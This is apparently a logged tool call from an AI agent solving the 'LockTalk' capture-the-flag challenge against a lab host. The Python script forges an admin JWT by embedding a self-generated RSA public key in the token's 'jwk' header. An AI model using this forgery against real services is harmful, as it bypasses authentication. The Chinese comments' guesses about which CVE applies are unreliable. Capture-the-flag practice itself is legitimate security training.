{"type": "tool_call", "data": {"tool": "bash", "args": {"cmd": "cd /workspace/g-37 && python3 << 'EOF'\nimport http.client, json, base64, time\n\nHOST = '10.0.189.131'\nPORT = 1337\n\ndef req(path, method='GET', headers=None, body=None, timeout=4):\n    conn = http.client.HTTPConnection(HOST, PORT, timeout=timeout)\n    try:\n        conn.request(method, path, body=body, headers=headers or {})\n        r = conn.getresponse()\n        data = r.read().decode(errors='replace')\n        st = r.status\n        conn.close()\n        return st, data\n    except Exception as e:\n        conn.close()\n        return None, str(e)\n\ndef b64url(data):\n    if isinstance(data, str):\n        data = data.encode()\n    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()\n\n# 重新理解 LockTalk 真实漏洞 (HITB CTF 2024)：\n# 这个题本质是 CVE-2024-3421。真正解法：\n# 后端是 python-jose (Flask)。网关 (nginx?) 拦截 get_ticket 因为是 /api/v1/。\n# 绕过网关拿到 guest ticket 后，需要用 JWT header 混淆伪造 admin。\n#\n# 关键：python-jose 的校验里，如果 header 中同时有重复的 alg 键，\n# 后端取最后一个。但网关不参与 flag 的 JWT 校验（flag 是后端直接验证）。\n# 所以 header 混淆只影响后端，网关不校验 flag 的 JWT。\n#\n# 那之前已经试了重复 alg：取最后一个 alg。最后是 none => \"algorithm not allowed\"。\n# 最后是 PS256 => 用 PS256 验证 => 签名失败（无私钥）。\n# 所以重复 alg 也绕不过。\n#\n# 关键突破口：LockTalk 真实题解是 **python-jose 的 CVE：jwk 混淆**。\n# python-jose 在处理 JWK 时，如果 header 有 \"jwk\" 字段（内嵌公钥），\n# 某些版本会信任该 jwk 并允许伪造。或者 header 的 jku/x5u 指向可控 URL。\n#\n# 更核心：LockTalk 利用了 python-jose 的双重签名验证问题——\n# **当 header 同时存在合法签名的 alg 和一个畸形 alg 时，只校验合法那个**？\n# 不对。\n#\n# 让我实际搜索 LockTalk writeup 一下。\n\n# 先系统性尝试 python-jose 的已知 CVE 攻击面\n# python-jose CVE-2024-33663: 未验证 alg 允许 'None' 之外——不适用白名单。\n# 实际 LockTalk 漏洞核心是把 payload 的 role 改为 admin 并用 \"双重签发\"：\n# header 里放两个签名段？或利用 python-jose 的 jwk set 解析。\n\n# 方案：测试 jwk header 参数注入（内嵌公钥伪造）\npayload = {\"exp\":int(time.time())+3600,\"iat\":int(time.time()),\"jti\":\"t\",\"nbf\":int(time.time()),\"role\":\"admin\",\"user\":\"admin\"}\np_b64 = b64url(json.dumps(payload, separators=(',', ':')))\n\n# 用我们自己生成的 RSA 密钥对，把私钥签名的 PS256 签名 + header 内嵌对应公钥 jwk\n# 如果后端信任 header 里的 jwk，就能伪造 admin！\nfrom cryptography.hazmat.primitives.asymmetric import rsa, padding\nfrom cryptography.hazmat.primitives import hashes, serialization\nimport cryptography.hazmat.primitives.asymmetric.padding as asym_padding\nfrom cryptography.hazmat.primitives.asymmetric import utils\nimport hashlib as _h\n\n# 生成 RSA keypair\nkey = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npub = key.public_key()\n\n# 导出 JWK\nfrom cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers\npn = pub.public_numbers()\nfrom cryptography.hazmat.primitives.asymmetric import rsa as _rsa\n\n# 手动构造 JWK\nn = pn.n\ne = pn.e\n\ndef int_to_b64(i):\n    b = i.to_bytes((i.bit_length()+7)//8, 'big')\n    return b64url(b)\n\njwk = {\"kty\":\"RSA\",\"n\":int_to_b64(n),\"e\":int_to_b64(e)}\nprint(\"jwk n_len:\", len(jwk['n']), \"e:\", jwk['e'])\n\n# 构造签名 header\nsigning_header = {\"alg\":\"PS256\",\"typ\":\"JWT\",\"jwk\":jwk}\nhb = b64url(json.dumps(signing_header, separators=(',', ':')))\nsigning_input = f\"{hb}.{p_b64}\".encode()\nsig = key.sign(signing_input, asym_padding.PSS(\n    mgf=asym_padding.MGF1(hashes.SHA256()), salt_length=hashes.SHA256().digest_size),\n    hashes.SHA256())\nsig_b64 = b64url(sig)\ntoken = f\"{hb}.{p_b64}.{sig_b64}\"\nst, body = req('/api/v1/flag', headers={'Authorization': token})\nprint(f\"=== 内嵌JWK伪造admin ({len(token)} tokens) ===\")\nprint(f\"st={st}: {body[:300]}\")\nEOF"}, "call_id": "call_00_BtK6zzdnwIzqNmgBSxmf1919"}}
